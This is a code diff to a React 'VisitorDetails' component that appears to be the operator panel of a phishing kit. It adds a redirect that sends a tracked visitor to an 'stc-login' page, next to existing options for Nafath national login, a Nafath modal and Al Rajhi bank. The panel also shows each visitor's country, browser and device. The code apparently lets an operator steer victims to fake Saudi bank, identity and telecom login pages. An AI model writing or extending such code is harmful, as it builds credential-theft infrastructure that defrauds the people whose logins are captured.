@@ -95,6 +95,12 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             currentStep: "rajhi" as any,
           };
           break;
+           case "stc":
+          updates = {
+            redirectPage: "stc-login" as any,
+            currentStep: "stc-login" as any,
+          };
+          break;
         case "phone":
           // Legacy system only
           updates = { currentStep: "phone" as any };
@@ -687,11 +693,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
   </div>
 )}
 
-{/* Add to Redirect Options */}
-const redirectOptions = [
-  // ... existing options ...
-  { value: "stc", label: "تسجيل دخول STC" },
-];
+
               {/* Device & Location Info */}
               {(visitor.country || visitor.browser || visitor.deviceType) && (
                 <div className="flex items-center gap-2 text-xs text-gray-500">
@@ -758,6 +760,7 @@ const redirectOptions = [
               <option value="nafad">نفاذ</option>
               <option value="nafad_modal">مودال نفاذ</option>
               <option value="rajhi">راجحي</option>
+              <option value="stc">stc</option>
             </select>
           </div>
         </div>
